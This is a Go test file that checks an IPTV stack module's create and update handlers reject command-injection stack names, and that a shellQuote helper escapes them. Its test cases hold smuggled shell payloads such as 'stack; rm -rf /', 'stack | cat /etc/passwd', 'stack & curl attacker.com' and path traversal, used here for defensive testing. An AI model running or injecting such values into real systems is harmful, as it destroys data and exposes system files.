package commands

import (
	"context"
	"testing"

	"github.com/atvirokodosprendimai/vvs/internal/modules/iptv/domain"
)

// mockIPTVStackRepository is a mock implementation for testing
type mockIPTVStackRepository struct {
	savedStack *domain.IPTVStack
}

func (m *mockIPTVStackRepository) Save(ctx context.Context, s *domain.IPTVStack) error {
	m.savedStack = s
	return nil
}

func (m *mockIPTVStackRepository) FindByID(ctx context.Context, id string) (*domain.IPTVStack, error) {
	return m.savedStack, nil
}

func (m *mockIPTVStackRepository) FindAll(ctx context.Context) ([]*domain.IPTVStack, error) {
	return nil, nil
}

func (m *mockIPTVStackRepository) Delete(ctx context.Context, id string) error {
	return nil
}

// TestCreateIPTVStackHandler_CommandInjectionPrevention tests that malicious stack names are rejected
func TestCreateIPTVStackHandler_CommandInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		stackName   string
		shouldError bool
		description string
	}{
		{
			name:        "valid name",
			stackName:   "production-stack-1",
			shouldError: false,
			description: "Valid stack name should be accepted",
		},
		{
			name:        "command injection with semicolon",
			stackName:   "stack; rm -rf /",
			shouldError: true,
			description: "Stack name with semicolon should be rejected",
		},
		{
			name:        "command injection with backticks",
			stackName:   "stack`whoami`",
			shouldError: true,
			description: "Stack name with backticks should be rejected",
		},
		{
			name:        "command injection with dollar",
			stackName:   "stack$(whoami)",
			shouldError: true,
			description: "Stack name with dollar sign should be rejected",
		},
		{
			name:        "command injection with pipe",
			stackName:   "stack | cat /etc/passwd",
			shouldError: true,
			description: "Stack name with pipe should be rejected",
		},
		{
			name:        "command injection with ampersand",
			stackName:   "stack & curl attacker.com",
			shouldError: true,
			description: "Stack name with ampersand should be rejected",
		},
		{
			name:        "path traversal attempt",
			stackName:   "../../../etc/passwd",
			shouldError: true,
			description: "Stack name with path traversal should be rejected",
		},
		{
			name:        "newline injection",
			stackName:   "stack\nrm -rf /",
			shouldError: true,
			description: "Stack name with newline should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repo := &mockIPTVStackRepository{}
			handler := NewCreateIPTVStackHandler(repo)

			cmd := CreateIPTVStackCommand{
				Name:               tt.stackName,
				ClusterID:          "cluster-1",
				NodeID:             "node-1",
				WANNetworkID:       "wan-net-1",
				OverlayNetworkID:   "overlay-net-1",
				WANNetworkName:     "wan_network",
				OverlayNetworkName: "overlay_network",
				WanIP:              "192.168.1.100",
				WANInterface:       "eth0",
			}

			_, err := handler.Handle(context.Background(), cmd)

			if tt.shouldError && err == nil {
				t.Errorf("%s: expected error but got none", tt.description)
			}
			if !tt.shouldError && err != nil {
				t.Errorf("%s: expected no error but got: %v", tt.description, err)
			}

			// If no error expected, verify the stack was saved
			if !tt.shouldError && repo.savedStack == nil {
				t.Errorf("%s: stack was not saved", tt.description)
			}

			// If error expected, verify the stack was NOT saved
			if tt.shouldError && repo.savedStack != nil {
				t.Errorf("%s: stack should not have been saved", tt.description)
			}
		})
	}
}

// TestUpdateIPTVStackHandler_CommandInjectionPrevention tests that malicious stack names are rejected on update
func TestUpdateIPTVStackHandler_CommandInjectionPrevention(t *testing.T) {
	repo := &mockIPTVStackRepository{
		savedStack: &domain.IPTVStack{
			ID:   "stack-1",
			Name: "original-name",
		},
	}
	handler := NewUpdateIPTVStackHandler(repo)

	maliciousNames := []string{
		"stack; rm -rf /",
		"stack`whoami`",
		"stack$(whoami)",
		"stack | cat /etc/passwd",
		"stack & curl attacker.com",
	}

	for _, maliciousName := range maliciousNames {
		t.Run(maliciousName, func(t *testing.T) {
			cmd := UpdateIPTVStackCommand{
				ID:                 "stack-1",
				Name:               maliciousName,
				ClusterID:          "cluster-1",
				NodeID:             "node-1",
				WANNetworkID:       "wan-net-1",
				OverlayNetworkID:   "overlay-net-1",
				WANNetworkName:     "wan_network",
				OverlayNetworkName: "overlay_network",
				WanIP:              "192.168.1.100",
				WANInterface:       "eth0",
			}

			err := handler.Handle(context.Background(), cmd)

			if err == nil {
				t.Errorf("Expected error for malicious name %q but got none", maliciousName)
			}

			// Verify the original name was not changed
			if repo.savedStack.Name != "original-name" {
				t.Errorf("Stack name should not have been updated to malicious value")
			}
		})
	}
}

// TestShellQuote_DefenseInDepth tests that shell quoting works correctly as a second layer of defense
func TestShellQuote_DefenseInDepth(t *testing.T) {
	// Even though validation should prevent these, test that shell quoting would protect us
	tests := []struct {
		input    string
		expected string
	}{
		{
			input:    "normal-stack",
			expected: "'normal-stack'",
		},
		{
			input:    "stack; rm -rf /",
			expected: "'stack; rm -rf /'",
		},
		{
			input:    "stack'test",
			expected: "'stack'\\''test'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := shellQuote(tt.input)
			if result != tt.expected {
				t.Errorf("shellQuote(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}
